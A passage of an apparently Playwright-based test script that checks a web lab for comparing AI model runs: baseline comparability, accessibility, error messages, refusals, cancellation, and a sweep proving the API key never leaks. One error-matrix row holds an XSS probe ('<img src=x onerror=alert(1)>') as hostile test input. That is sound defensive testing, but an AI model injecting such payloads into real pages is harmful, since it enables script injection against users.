  c = await go("Rerun");
  check(
    "B1 step 5 an edited run with only other models' baselines shows the actionable reason",
    c.notComparable === "Not comparable: config differs (provider, model, temperature, or max tokens) — click “Run baseline live” with this model first.",
    c.notComparable ?? c.text.slice(0, 200),
  );
  // 6. Following that advice: baseline for this model, then the edited run compares with it.
  c = await go("Run baseline live");
  check("B1 step 6 GPT-4o mini baseline → 'Live baseline only — edit and rerun'", c.text.includes("Live baseline only — edit and rerun") && !c.notComparable);
  c = await go("Rerun");
  check("B1 step 7 GPT-4o mini edited rerun compares with its own baseline (run 6)", !c.notComparable && c.baseline?.["Run ID"] === "spouse-parity-run-6" && c.latest?.["Requested model"] === "gpt-4o-mini", JSON.stringify({ nc: c.notComparable, b: c.baseline?.["Run ID"] }));
  // 8. An unedited run that had errors, with a same-model ok baseline: says which version did not complete.
  t.cap.handler = perModelHandler({ failB: true });
  c = await go("Run baseline live");
  check("B1 step 8 a failed GPT-4o mini baseline is compared with its own ok baseline: 'Version B did not complete (model error) — rerun to compare'", c.notComparable === "Not comparable: Version B did not complete (model error) — rerun to compare" && c.baseline?.["Run ID"] === "spouse-parity-run-6", c.notComparable ?? c.text.slice(0, 200));
  // 9. An unedited run that had errors on a model with no ok baseline of its own: 'baseline had errors', never 'config differs'.
  await p.locator("#lab-live-model").selectOption("gpt-4.1-mini");
  c = await go("Run baseline live");
  check("B1 step 9 a failed baseline on a model with no ok baseline → 'Live baseline had errors — run it again'", c.text.includes("Live baseline had errors — run it again") && !c.notComparable, c.text.slice(0, 200));
  await p.screenshot({ path: join(EVIDENCE, "verifier-live-b1.png"), fullPage: false });
  await t.cap.context.close();
});

await step("B1 follow-up: a baseline run whose A and B model ids differ or are missing is not comparable, and never a baseline", async () => {
  const t = await newLabPage();
  const p = t.page;
  await p.goto(LAB, { waitUntil: "networkidle" });
  await p.locator("input[name=response-source][value=live]").check();
  await p.locator("#lab-live-key").fill(ANT_KEY);
  let n = 0;
  const go = async (button) => {
    await p.getByRole("button", { name: button, exact: true }).click();
    await waitRun(p, ++n);
    return compareMeta(p);
  };
  const split = okHandler({ returned: { a: "claude-haiku-4-5-20251001", b: "claude-haiku-4-5-20260301" } });
  // 1. A and B report different model ids: not "baseline only"; the reason is shown with the run's metadata.
  t.cap.handler = split;
  let c = await go("Run baseline live");
  check(
    "B1+ a split baseline run alone → 'Not comparable: Versions A and B were answered by different model versions', not 'baseline only'",
    c.notComparable === "Not comparable: Versions A and B were answered by different model versions" && !c.text.includes("Live baseline only") && c.latest?.["Run ID"] === "spouse-parity-run-1" && c.baseline === null,
    c.notComparable ?? c.text.slice(0, 200),
  );
  // 2. Version B reports no model id.
  t.cap.handler = (e) => {
    const r = okHandler()(e);
    if (e.body?.variant === "b") delete r.body.returnedModel;
    return r;
  };
  c = await go("Run baseline live");
  check("B1+ a baseline run where Version B reports no model id → not comparable, with that reason", (c.notComparable ?? "").startsWith("Not comparable: Version B did not return a model id"), c.notComparable ?? c.text.slice(0, 200));
  // 3. A consistent baseline: "baseline only" (the two earlier runs are never its baseline).
  t.cap.handler = perModelHandler();
  c = await go("Run baseline live");
  check("B1+ a consistent baseline after split runs → 'Live baseline only — edit and rerun'", c.text.includes("Live baseline only — edit and rerun") && !c.notComparable, c.text.slice(0, 200));
  // 4. Another split baseline run: compared with the consistent same-model baseline, so the reason is shown against it.
  t.cap.handler = split;
  c = await go("Run baseline live");
  check(
    "B1+ a split baseline run with a consistent same-model baseline → compared with it (run 3) and refused with the model-version reason",
    c.notComparable === "Not comparable: Versions A and B were answered by different model versions" && c.baseline?.["Run ID"] === "spouse-parity-run-3",
    JSON.stringify({ nc: c.notComparable, b: c.baseline?.["Run ID"] }),
  );
  // 5. An edited run: compared with the consistent baseline (run 3), never the newer split run (run 4).
  await addPreset(p, "FIX-VERIFY");
  t.cap.handler = perModelHandler();
  c = await go("Rerun");
  check("B1+ an edited run compares with the consistent baseline (run 3), never the newer split run", !c.notComparable && !!parseSummary(c.text) && c.baseline?.["Run ID"] === "spouse-parity-run-3", JSON.stringify({ nc: c.notComparable, b: c.baseline?.["Run ID"] }));
  await t.cap.context.close();
});

// =====================================================================================
// U1–U3: additive copy, with accessibility checks
// =====================================================================================
const U1_NOTE = "Live mode is selected — the results below are from a simulated run until you run live.";
const U2_HELP = "Runs the scenario's original instruction (not your edits) to set the live baseline. Use Rerun to run your edited instruction.";
const RUBRIC = /export const RUBRIC_VERSION = "([^"]+)";/.exec(readFileSync(new URL("../../lib/lab/scenarios.ts", import.meta.url), "utf8"))?.[1];

await step("U1–U3 copy, placement, and accessibility", async () => {
  const t = await newLabPage();
  const p = t.page;
  await p.goto(LAB, { waitUntil: "networkidle" });
  const noteInfo = () =>
    p.evaluate((note) => {
      const el = [...document.querySelectorAll("main p")].find((x) => (x.textContent ?? "").trim() === note);
      if (!el) return null;
      const banner = document.querySelector("[role=note]");
      let liveAncestor = false;
      for (let n = el; n; n = n.parentElement) if (n.getAttribute("aria-live") || ["status", "alert", "log"].includes(n.getAttribute("role") ?? "")) liveAncestor = true;
      return { afterBanner: banner?.nextElementSibling === el, liveAncestor, role: el.getAttribute("role"), focusable: el.tabIndex >= 0, visible: el.getBoundingClientRect().height > 0 };
    }, U1_NOTE);
  check("U1 Simulated selected: no note", (await noteInfo()) === null);
  await p.locator("input[name=response-source][value=live]").check();
  const info = await noteInfo();
  check("U1 Live selected + simulated run on screen: the note appears right under the banner", !!info && info.afterBanner && info.visible, JSON.stringify(info));
  check("U1 the note is static: no role, not inside a live region, not focusable", !!info && !info.liveAncestor && info.role === null && !info.focusable, JSON.stringify(info));
  check("U1 the banner text is unchanged (still the simulated banner)", (await bannerText(p)).startsWith("Simulated demo — no AI model is called"));
  // U2: helper text tied to "Run baseline live".
  const btn = p.getByRole("button", { name: "Run baseline live" });
  const describedBy = await btn.getAttribute("aria-describedby");
  const helpText = describedBy ? await p.locator(`#${describedBy}`).innerText() : "";
  check("U2 'Run baseline live' has aria-describedby pointing at the exact helper text", !!describedBy && helpText === U2_HELP, `${describedBy}: ${helpText}`);
  const cdp = await t.cap.context.newCDPSession(p);
  const ax = await cdp.send("Accessibility.getFullAXTree");
  const node = ax.nodes.find((x) => x.role?.value === "button" && x.name?.value === "Run baseline live");
  check("U2 the browser's accessibility tree gives the button that description", node?.description?.value === U2_HELP, node?.description?.value ?? "(none)");
  const helpFocusable = await p.locator(`#${describedBy}`).evaluate((el) => el.tabIndex >= 0 || el.hasAttribute("aria-live") || el.hasAttribute("role"));
  check("U2 the helper text is static (not focusable, no role, not live)", helpFocusable === false);
  // Tab order: every tab stop in /lab is an interactive control; the new text is never a stop.
  const stops = [];
  await p.evaluate(() => window.scrollTo(0, 0));
  // Start from the first link in the site nav, so the sweep covers the whole page in order.
  await p.locator("body > nav a").first().focus();
  for (let i = 0; i < 150; i++) {
    await p.keyboard.press("Tab");
    const st = await p.evaluate(() => {
      const el = document.activeElement;
      if (!el || el === document.body) return null;
      const interactive = el.matches("a[href], button, input, select, textarea, summary, [role=region][tabindex='0']");
      return { tag: el.tagName.toLowerCase(), text: (el.textContent ?? "").trim().slice(0, 60), id: el.id, interactive, inFooter: !!el.closest("footer") };
    });
    if (!st || st.inFooter) break;
    stops.push(st);
  }
  const bad = stops.filter((x) => !x.interactive || x.text === U1_NOTE || x.text === U2_HELP);
  check(`U1/U2 tab order: all ${stops.length} stops are interactive controls; the note and helper text are never stops`, stops.length > 30 && bad.length === 0, bad.length ? JSON.stringify(bad.slice(0, 3)) : stops.map((x) => x.text.slice(0, 18)).join(" > "));
  const runIdx = stops.findIndex((x) => x.text === "Run baseline live");
  check("U2 'Run baseline live' directly follows 'Rerun' in the tab order", runIdx > 0 && stops[runIdx - 1].text === "Rerun", JSON.stringify(stops.slice(Math.max(0, runIdx - 2), runIdx + 2)));
  // U3: rubric version in run metadata (simulated run on screen).
  const inspect = await inspectText(p);
  check(`U3 simulated run metadata shows 'Rubric version ${RUBRIC}'`, !!RUBRIC && new RegExp(`Rubric version\\s+${RUBRIC.replace(/\./g, "\\.")}`).test(inspect), inspect.slice(-500).replace(/\n/g, " "));
  // A live run on screen: the note disappears; showing the simulated baseline brings it back.
  await p.locator("#lab-live-key").fill(ANT_KEY);
  t.cap.handler = perModelHandler();
  await btn.click();
  await waitRun(p, 1);
  check("U1 a live run on screen: no note", (await noteInfo()) === null);
  await p.locator("input[name=view-run][value=baseline]").check();
  check("U1 showing the simulated baseline again with Live selected: the note is back", !!(await noteInfo()));
  await p.locator("input[name=view-run][value=latest]").check();
  await setSource(p, "simulated");
  check("U1/U2 Simulated selected: no note and no helper text", (await noteInfo()) === null && (await p.locator("#lab-baseline-live-help").count()) === 0);
  // U3: both comparison columns (a simulated rerun compares with the simulated baseline).
  await rerun(p);
  await waitRun(p, 2);
  const c = await compareMeta(p);
  check(`U3 both comparison columns show 'Rubric version ${RUBRIC}'`, c.baseline?.["Rubric version"] === RUBRIC && c.latest?.["Rubric version"] === RUBRIC, JSON.stringify({ b: c.baseline?.["Rubric version"], l: c.latest?.["Rubric version"] }));
  await t.cap.context.close();
});

// =====================================================================================
// C. L5: every failure is a distinct non-pass state with a fixed message
// =====================================================================================
await step("C. L5 error matrix in the UI", async () => {
  await page.locator("#lab-live-key").fill(ANT_KEY);
  const rows = [
    // The route's own fixed request-check messages are shown as they are (each check has its own).
    ["route 400 (key)", () => ({ status: 400, body: { status: "model_error", message: MSG.routeKey } }), `Live request failed — not evaluated (${MSG.routeKey})`],
    ["route 400 (scenario)", () => ({ status: 400, body: { status: "model_error", message: "Unknown scenario" } }), "Live request failed — not evaluated (Unknown scenario)"],
    ["route 405", () => ({ status: 405, body: { status: "model_error", message: "Method not allowed" } }), "Live request failed — not evaluated (Method not allowed)"],
    ["route 409", () => ({ status: 409, body: { status: "model_error", message: "Scenario version mismatch — reload the page" } }), "Live request failed — not evaluated (Scenario version mismatch — reload the page)"],
    ["route 413", () => ({ status: 413, body: { status: "model_error", message: "Request body too large" } }), "Live request failed — not evaluated (Request body too large)"],
    ["route 415", () => ({ status: 415, body: { status: "model_error", message: "Content type must be application/json" } }), "Live request failed — not evaluated (Content type must be application/json)"],
    // Without a usable route message, each status code has its own fixed fallback; raw text is never shown.
    ["bare 400 (unlisted message quoting the key)", () => ({ status: 400, body: { status: "model_error", message: `bad key ${ANT_KEY}` } }), "Live request failed — not evaluated (The lab server rejected the request)"],
    ["bare 405 (empty body)", () => ({ status: 405, body: "" }), "Live request failed — not evaluated (The lab server only accepts POST requests)"],
    ["bare 409 (HTML body)", () => ({ status: 409, body: "<html>oops</html>" }), "Live request failed — not evaluated (This page is out of date — reload it and try again)"],
    ["bare 413 (proxy reply)", () => ({ status: 413, body: "<html>oops</html>" }), "Live request failed — not evaluated (The request was too large)"],
    ["bare 415 (empty JSON)", () => ({ status: 415, body: {} }), "Live request failed — not evaluated (The lab server only accepts JSON requests)"],
    ["firewall 429", () => ({ status: 429, body: "rate limited" }), "Live request failed — not evaluated (Too many live requests — wait a minute and try again)"],
    ["route 500", () => ({ status: 500, body: { status: "model_error", message: "Internal error" } }), "Live request failed — not evaluated (The lab server failed to handle the request)"],
    ["provider: bad key", () => ({ body: { status: "credentials_unavailable", error: MSG.badKey, durationMs: 5 } }), `Credentials unavailable — not evaluated (${MSG.badKey})`],
    ["provider: token limit", () => ({ body: { status: "model_error", error: MSG.tokenLimit, returnedModel: "claude-haiku-4-5-20251001", stopReason: "max_tokens", durationMs: 5 } }), `Live request failed — not evaluated (${MSG.tokenLimit})`],
    ["provider: refusal (both)", () => ({ body: { status: "provider_refused", error: MSG.refused, returnedModel: "claude-haiku-4-5-20251001", stopReason: "refusal", durationMs: 5 } }), "Provider declined (safety system) — not evaluated"],
    ["provider: rate limit", () => ({ body: { status: "model_error", error: MSG.rateLimited, durationMs: 5 } }), `Live request failed — not evaluated (${MSG.rateLimited})`],
    ["provider: no quota", () => ({ body: { status: "model_error", error: MSG.noQuota, durationMs: 5 } }), `Live request failed — not evaluated (${MSG.noQuota})`],
    // D40: the provider's 400, 402, 403, and 404 each have their own state and message.
    ["provider: 400 bad request", () => ({ body: { status: "model_error", error: MSG.rejected, durationMs: 5 } }), `Live request failed — not evaluated (${MSG.rejected})`],
    ["provider: 402 billing", () => ({ body: { status: "model_error", error: MSG.billing, durationMs: 5 } }), `Live request failed — not evaluated (${MSG.billing})`],
    ["provider: 403 key denied", () => ({ body: { status: "credentials_unavailable", error: MSG.keyDenied, durationMs: 5 } }), `Credentials unavailable — not evaluated (${MSG.keyDenied})`],
    ["provider: 404 model unavailable", () => ({ body: { status: "model_error", error: MSG.modelUnavailable, durationMs: 5 } }), `Live request failed — not evaluated (${MSG.modelUnavailable})`],
    ["provider: anything else", () => ({ body: { status: "model_error", error: MSG.unavailable, durationMs: 5 } }), `Live request failed — not evaluated (${MSG.unavailable})`],
    ["provider: timeout (server 30 s)", () => ({ body: { status: "timeout", durationMs: 30000 } }), "Live request timed out — not evaluated"],
    ["network failure", () => ({ abort: true }), "Live request failed — not evaluated (Could not reach the lab server)"],
    ["hostile 200 (unlisted message quoting the key)", () => ({ body: { status: "model_error", error: `upstream said ${ANT_KEY} <img src=x onerror=alert(1)>`, durationMs: 5 } }), `Live request failed — not evaluated (${MSG.unavailable})`],
    ["malformed 200", () => ({ body: "<html>oops</html>" }), "Live request failed — not evaluated (The lab server failed to handle the request)"],
  ];
  let n = 9;
  const seen = new Map();
  for (const [name, handler, expected] of rows) {
    main.cap.handler = handler;
    await rerun(page);
    n += 1;
    await waitRun(page, n);
    const alerts = await editAlerts(page);
    const hl = await headline(page);
    const inspect = await inspectText(page);
    const label = await shownRunLabel(page);
    const parts = splitLabel(alerts[0]);
    check(`L5 ${name}: alert '${expected}', labelled with the displayed run (F2)`, alerts.length === 1 && label === `Run ${n}` && parts.label === label && parts.text === expected, JSON.stringify({ label, alerts }));
    check(`L5 ${name}: headline is not a pass`, hl !== ALL_PASS && /not a pass|incomplete/i.test(hl), hl);
    check(`L5 ${name}: both versions shown as not evaluated / not OK`, (inspect.match(/Response status: OK/g) ?? []).length === 0, inspect.slice(0, 100));
    check(`L5 ${name}: no raw server text or key on the page`, !leaksKey(await page.content()) && !(await page.content()).includes("upstream said") && !(await page.content()).includes("oops"));
    if (name === "provider: timeout (server 30 s)") {
      const cmp = await compareText(page);
      check("L2/fix round: compare names the failure ('did not complete (… timed out …) — rerun to compare')", /Not comparable: Versions A and B did not complete \(A: timed out; B: timed out\) — rerun to compare/.test(cmp), cmp.slice(0, 200));
    }
    seen.set(name, parts.text); // compared without the run label, which alone would make every alert unique
  }
  await page.screenshot({ path: join(EVIDENCE, "verifier-live-03-error-state.png"), fullPage: false });
  const providerRows = [...seen.entries()].filter(([k]) => k.startsWith("provider:")).map(([, v]) => v);
  check("L5 every provider result-mapping row has its own alert text", new Set(providerRows).size === providerRows.length, providerRows.join(" | "));
  const routeRows = [...seen.entries()].filter(([k]) => k.startsWith("route 4")).map(([, v]) => v);
  check("L5 every route request-check failure (400 key, 400 scenario, 405, 409, 413, 415) has its own alert text", routeRows.length === 6 && new Set(routeRows).size === routeRows.length, routeRows.join(" | "));
  const fallbackRows = ["bare 400 (unlisted message quoting the key)", "bare 405 (empty body)", "bare 409 (HTML body)", "bare 413 (proxy reply)", "bare 415 (empty JSON)", "firewall 429", "route 500"].map((k) => seen.get(k));
  check("L5 without a usable route message, 400/405/409/413/415/429/5xx each have their own fallback alert", new Set(fallbackRows).size === fallbackRows.length, fallbackRows.join(" | "));
  main.cap.handler = okHandler();
});

// =====================================================================================
// D. D34: one-sided refusal note
// =====================================================================================
await step("D. D34 one-sided refusal note", async () => {
  const refuse = (vs) => (e) => {
    const v = e.body?.variant;
    if (vs.includes(v)) return { body: { status: "provider_refused", error: MSG.refused, returnedModel: "claude-haiku-4-5-20251001", stopReason: "refusal", durationMs: 4 } };
    return okHandler()(e);
  };
  const pageText = () => page.locator("main").innerText();
  let n = Number((await statusTexts(page)).join(" ").match(/Run (\d+) complete/)?.[1] ?? 0);
  main.cap.handler = refuse(["b"]);
  await rerun(page);
  await waitRun(page, ++n);
  let t = await pageText();
  check("D34 only B refused → note names Version B", t.includes(ASYM("B")), t.match(/Only Version[^\n]*/)?.[0] ?? "(no note)");
  const findingsAlerts = () => page.evaluate(() => [...document.querySelectorAll("section[aria-labelledby=findings] [role=alert]")].map((a) => (a.textContent ?? "").trim()));
  check("F2 the D34 note is labelled with the displayed run", JSON.stringify(await findingsAlerts()) === JSON.stringify([`${await shownRunLabel(page)}: ${ASYM("B")}`]), JSON.stringify(await findingsAlerts()));
  check("D34 only B refused → headline stays 'Incomplete — not a pass'", (await headline(page)) === "Incomplete — not a pass", await headline(page));
  const bResults = await page.locator("section[aria-labelledby=findings]").innerText();
  check("D34 the refused version's checks stay not evaluated (no pass/fail for B)", /Not evaluated/.test(bResults));
  await page.screenshot({ path: join(EVIDENCE, "verifier-live-04-one-sided-refusal.png"), fullPage: false });
  const noteRun = n;
  main.cap.handler = refuse(["a"]);
  await rerun(page);
  await waitRun(page, ++n);
  t = await pageText();
  check("D34 only A refused → note names Version A", t.includes(ASYM("A")) && !t.includes(ASYM("B")));
  const cmpA = await compareText(page);
  check("D34 A refused + B ok → compare: 'Version A was declined … — not comparable (see the note …)', no rerun hint", cmpA.includes("Not comparable: Version A was declined by the provider's safety system — not comparable (see the note under “3. Review findings”)") && !/rerun to compare/.test(cmpA), cmpA.slice(0, 220));
  main.cap.handler = (e) => (e.body?.variant === "a" ? refuse(["a"])(e) : { body: { status: "timeout", durationMs: 30000 } });
  await rerun(page);
  await waitRun(page, ++n);
  t = await pageText();
  const cmpAT = await compareText(page);
  check("D34 A refused + B timed out → no asymmetry note", !/Only Version [AB] was declined/.test(t));
  check("D34 A refused + B timed out → compare names both, with a rerun hint", cmpAT.includes("Versions A and B did not complete (A: declined by the provider; B: timed out) — rerun to compare"), cmpAT.slice(0, 220));
  main.cap.handler = refuse(["a", "b"]);
  await rerun(page);
  await waitRun(page, ++n);
  t = await pageText();
  check("D34 both refused → no asymmetry note", !/Only Version [AB] was declined/.test(t));
  check("D34 both refused → compare names both, with a rerun hint", (await compareText(page)).includes("Versions A and B did not complete (A: declined by the provider; B: declined by the provider) — rerun to compare"));
  main.cap.handler = okHandler();
  await rerun(page);
  await waitRun(page, ++n);
  t = await pageText();
  check("D34 neither refused → no asymmetry note", !/Only Version [AB] was declined/.test(t));
  // Follows the displayed run.
  await page.locator(`input[name=view-run][value="spouse-parity-run-${noteRun}"]`).check();
  t = await pageText();
  check("D34 note follows the displayed run (shown again for the one-sided run)", t.includes(ASYM("B")));
  check("F2 the re-shown note carries that older run's label", (await shownRunLabel(page)) === `Run ${noteRun}` && JSON.stringify(await findingsAlerts()) === JSON.stringify([`Run ${noteRun}: ${ASYM("B")}`]), JSON.stringify(await findingsAlerts()));
  await page.locator("input[name=view-run][value=baseline]").check();
  t = await pageText();
  check("D34 never on a simulated run", !/Only Version [AB] was declined/.test(t));
  await page.locator("input[name=view-run][value=latest]").check();
});

// =====================================================================================
// E. L8: Cancel aborts both calls; focus to Cancel and back
// =====================================================================================
await step("E. L8 Cancel", async () => {
  main.cap.handler = () => ({ hang: true });
  main.cap.api.length = 0;
  const failedBefore = main.cap.failed.length;
  const trigger = page.getByRole("button", { name: "Run baseline live" });
  await trigger.focus();
  await page.keyboard.press("Enter");
  await page.waitForFunction(() => [...document.querySelectorAll("button")].some((b) => b.textContent?.trim() === "Cancel"), null, { timeout: 5000 });
  for (let i = 0; i < 50 && main.cap.api.length < 2; i++) await sleep(50);
  check("L8 both calls are in flight before Cancel", main.cap.api.length === 2, String(main.cap.api.length));
  const during = await page.evaluate(() => ({
    rerunDisabled: [...document.querySelectorAll("button")].find((b) => b.textContent?.trim() === "Rerun")?.disabled ?? null,
    busy: document.querySelector("section[aria-labelledby=edit]")?.getAttribute("aria-busy"),
  }));
  check("L8 run buttons disabled and section aria-busy while in flight", during.rerunDisabled === true && during.busy === "true", JSON.stringify(during));
  check("FIX focus moves to Cancel during a live run", (await activeText(page)) === "Cancel", await activeText(page));
  await page.getByRole("button", { name: "Cancel" }).focus();
  await page.keyboard.press("Enter");
  await page.waitForFunction(() => [...document.querySelectorAll("[role=status]")].some((s) => /complete|could not/i.test(s.textContent ?? "")), null, { timeout: 5000 });
  await sleep(300);
  const aborted = main.cap.failed.slice(failedBefore).filter((f) => f.url.includes("/api/lab/run"));
  check("L8 Cancel aborts both in-flight requests", aborted.length === 2, JSON.stringify(aborted));
  const alerts = await editAlerts(page);
  const cancelLabel = await shownRunLabel(page);
  check("L8 cancelled run: alert '<Run N>: Live request cancelled — not evaluated', N = the displayed run", alerts.length === 1 && /^Run \d+$/.test(cancelLabel) && alerts[0] === `${cancelLabel}: Live request cancelled — not evaluated`, JSON.stringify({ cancelLabel, alerts }));
  check("L8 cancelled run is not a pass", (await headline(page)) !== ALL_PASS);
  check("L8 Cancel button gone and run buttons enabled again", (await page.getByRole("button", { name: "Cancel" }).count()) === 0 && (await trigger.isEnabled()));
  check("FIX focus returns to the control that started the run", (await activeText(page)) === "Run baseline live", await activeText(page));
  main.cap.handler = okHandler();
});

// =====================================================================================
// F. L4: the key is nowhere it should not be (main page, after many live runs)
// =====================================================================================
await step("F. L4 key exposure sweep", async () => {
  // A human review on a live run, then export the review log.
  await page.locator("#lab-live-key").fill(ANT_KEY);
  await runBaselineLive(page);
  await page.waitForTimeout(800);
  const disagree = page.locator("section[aria-labelledby=findings] button:not([disabled])", { hasText: "Disagree with this result" }).first();
  await disagree.click();
  await page.locator("section[aria-labelledby=findings] form input[type=radio][value=inconclusive]").first().check();
  await page.locator("section[aria-labelledby=findings] form textarea").first().fill("Reviewed on a live run.");
  await page.locator("section[aria-labelledby=findings] form button[type=submit]").first().click();
  const [dl] = await Promise.all([page.waitForEvent("download", { timeout: 5000 }), page.getByRole("button", { name: "Download review log (JSON)" }).click()]);
  const log = readFileSync(await dl.path(), "utf8");
  check("L4 review-log export contains the live run's override and no part of the key", /spouse-parity-run-\d+/.test(log) && !leaksKey(log), log.slice(0, 160));

  const sweep = await page.evaluate(() => {
    const out = { html: document.documentElement.outerHTML, attrs: [], values: [], keyAttr: null, ls: [], ss: [], cookie: document.cookie, href: location.href, hist: JSON.stringify(history.state ?? null) };
    for (const el of document.querySelectorAll("*")) for (const a of el.attributes) out.attrs.push(a.value);
    for (const el of document.querySelectorAll("input, textarea, select")) if (el.id !== "lab-live-key") out.values.push(el.value);
    out.keyAttr = document.querySelector("#lab-live-key")?.getAttribute("value") ?? null;
    try {
      for (let i = 0; i < localStorage.length; i++) out.ls.push(localStorage.key(i) + "=" + localStorage.getItem(localStorage.key(i)));
      for (let i = 0; i < sessionStorage.length; i++) out.ss.push(sessionStorage.key(i) + "=" + sessionStorage.getItem(sessionStorage.key(i)));
    } catch {}
    return out;
  });
  const idb = await page.evaluate(async () => (indexedDB.databases ? (await indexedDB.databases()).map((d) => d.name) : []));
  const cacheKeys = await page.evaluate(async () => ("caches" in self ? await caches.keys() : []));
  const cookies = await main.cap.context.cookies();
  check("L4 key not in the DOM after submission (markup, attributes, other fields; no value attribute on the key field)", !leaksKey(sweep.html) && !leaksKey(sweep.attrs.join("\n")) && !leaksKey(sweep.values.join("\n")) && sweep.keyAttr === null);
  check("L4 key still only in the key field's live value (expected until cleared)", (await page.locator("#lab-live-key").inputValue()) === ANT_KEY);
  check("L4 key not in localStorage or sessionStorage", !leaksKey(sweep.ls.join("\n")) && !leaksKey(sweep.ss.join("\n")), `${sweep.ls.length} local, ${sweep.ss.length} session entries`);
  check("L4 key not in cookies (document and browser jar)", !leaksKey(sweep.cookie) && !leaksKey(JSON.stringify(cookies)), `${cookies.length} cookies`);
  check("L4 no IndexedDB or Cache Storage use", idb.length === 0 && cacheKeys.length === 0, JSON.stringify({ idb, cacheKeys }));
  check("L4 key not in the URL or history state", !leaksKey(sweep.href) && !leaksKey(sweep.hist));
  const others = main.cap.requests.filter((r) => !r.url.includes("/api/lab/run"));
  check("L4 no other request carries the key (URL, headers, body)", others.every((r) => !leaksKey(r.url) && !leaksKey(JSON.stringify(r.headers)) && !leaksKey(r.post)), `${others.length} other requests`);
  const apiReqs = main.cap.requests.filter((r) => r.url.includes("/api/lab/run"));
  check("L4 every /api/lab/run request carries the key only in Authorization", apiReqs.length > 10 && apiReqs.every((r) => !leaksKey(r.url) && !leaksKey(r.post) && !leaksKey(JSON.stringify({ ...r.headers, authorization: undefined }))), `${apiReqs.length} requests`);
  check("L4 key never written to the console", !main.cap.console.some(leaksKey), `${main.cap.console.length} console messages`);

  // React state and props: walk the fiber tree (both trees) and every hook's state; never read DOM nodes.
  const react = await page.evaluate(({ a, o }) => {
    const host = document.querySelector("#lab-instruction");
    const fk = Object.keys(host).find((k) => k.startsWith("__reactFiber$"));
    if (!fk) return { error: "no fiber" };
    let f = host[fk];
    while (f.return) f = f.return;
    const fibers = new Set();
    const stack = [f];
    while (stack.length) {
      const x = stack.pop();
      if (!x || fibers.has(x)) continue;
      fibers.add(x);
      stack.push(x.child, x.sibling, x.alternate);
    }
    const seen = new Set();
    const hits = [];
    let strings = 0;
    function scan(v, path) {
      if (v === null || v === undefined) return;
      if (typeof v === "string") {
        strings += 1;
        if (v.includes(a) || v.includes(o) || v.includes(a.slice(12, 28)) || v.includes(o.slice(8, 24))) hits.push(path);
        return;
      }
      if (typeof v !== "object") return;
      if (typeof Node !== "undefined" && v instanceof Node) return; // never read DOM values
      if (seen.has(v)) return;
      seen.add(v);
      if (fibers.has(v)) return;
      for (const k of Object.keys(v)) {
        if (k === "_owner" || k === "_debugOwner" || k === "stateNode" || k === "return" || k === "child" || k === "sibling" || k === "alternate") continue;
        let child;
        try {
          child = v[k];
        } catch {
          continue;
        }
        scan(child, `${path}.${k}`);
      }
    }
    let i = 0;
    for (const x of fibers) {
      const name = typeof x.type === "function" ? x.type.name : typeof x.type === "string" ? x.type : String(x.tag);
      scan(x.memoizedProps, `${name}#${i}.props`);
      scan(x.pendingProps, `${name}#${i}.pendingProps`);
      scan(x.memoizedState, `${name}#${i}.state`);
      scan(x.updateQueue, `${name}#${i}.updateQueue`);
      i += 1;
    }
    return { fibers: fibers.size, strings, hits: hits.slice(0, 10) };
  }, { a: ANT_KEY, o: OAI_KEY });
  check("L4 key absent from React state and props (all fibers, both trees, every hook)", !react.error && react.fibers > 50 && react.strings > 100 && react.hits.length === 0, JSON.stringify(react));
  const globals = await page.evaluate(() => Object.keys(window).filter((k) => {
    try {
      return typeof window[k] === "string";
    } catch {
      return false;
    }
  }).map((k) => window[k]).join("\n"));
  check("L4 key not in any string global", !leaksKey(globals));

  // Clearing: pagehide (real window event, real LivePanel listener).
  await page.evaluate(() => window.dispatchEvent(new PageTransitionEvent("pagehide", { persisted: true })));
  check("L4 a real pagehide event clears the key field", (await page.locator("#lab-live-key").inputValue()) === "");
  // Provider switch (D35).
  await page.locator("#lab-live-key").fill(ANT_KEY);
  await page.locator("#lab-live-provider").selectOption("openai");
  const st = (await statusTexts(page)).join(" | ");
  check("D35 switching provider empties the key field", (await page.locator("#lab-live-key").inputValue()) === "");
  check("D35 switching provider announces 'Key cleared — enter your OpenAI key'", st.includes("Key cleared — enter your OpenAI key"), st);
  check("D35 the key label follows the provider", (await page.locator('label[for="lab-live-key"]').innerText()) === "Your OpenAI API key");
  // OpenAI request shape.
  await page.locator("#lab-live-key").fill(OAI_KEY);
  main.cap.api.length = 0;
  main.cap.handler = okHandler({ returned: { a: "gpt-4o-mini-2024-07-18", b: "gpt-4o-mini-2024-07-18" } });
  await runBaselineLive(page);
  await page.waitForFunction(() => document.querySelector("[role=note]")?.textContent?.includes("OpenAI"), null, { timeout: 10000 });
  check("L3 OpenAI run: provider/model in the body, the OpenAI key only in the header", main.cap.api.length === 2 && main.cap.api.every((e) => e.body?.provider === "openai" && e.body?.model === "gpt-4o-mini" && e.headers.authorization === `Bearer ${OAI_KEY}`));
  check("L6 OpenAI banner names OpenAI and the returned model", (await bannerText(page)).trim() === `Live run: responses from OpenAI gpt-4o-mini-2024-07-18. ${BANNER_TAIL}`, await bannerText(page));
  await page.locator("#lab-live-key").fill(ANT_KEY);
  main.cap.api.length = 0;
  await runBaselineLive(page);
  await sleep(400);
  check("D35 an Anthropic key with OpenAI selected is refused in the page: inline error, no request", main.cap.api.length === 0 && (await page.locator("#lab-live-key-error").innerText()).includes(MSG.badProvider));
  await page.locator("#lab-live-provider").selectOption("anthropic");
  main.cap.handler = okHandler();
});

await step("F. L4 key cleared on reload and on back/forward navigation", async () => {
  await page.locator("#lab-live-key").fill(ANT_KEY);
  await page.reload({ waitUntil: "networkidle" });
  const afterReload = (await page.locator("#lab-live-key").count()) === 0 ? "" : await page.locator("#lab-live-key").inputValue();
  check("L4 after reload the key field is empty (or absent)", afterReload === "");
  await setSource(page, "live");
  await page.locator("#lab-live-key").fill(ANT_KEY);
  await page.evaluate(() => {
    window.__verifierMarker = "kept";
    window.addEventListener("pageshow", (e) => (window.__persisted = e.persisted));
  });
  await page.goto(`${ORIGIN}/tools`, { waitUntil: "networkidle" });
  await page.goBack({ waitUntil: "networkidle" });
  const state = await page.evaluate(() => ({
    restoredFromBfcache: window.__verifierMarker === "kept",
    persisted: window.__persisted ?? null,
    panel: !!document.querySelector("#lab-live-key"),
    value: document.querySelector("#lab-live-key")?.value ?? null,
  }));
  observe(`Back/forward: restored from bfcache=${state.restoredFromBfcache}, live panel present=${state.panel}`);
  check("L4 after leaving and coming back (back/forward), the key field is empty", state.value === null || state.value === "", JSON.stringify({ ...state, value: state.value ? "(non-empty)" : state.value }));
});

// =====================================================================================
// G. L8 client timeout (45 s) with a fake clock
// =====================================================================================
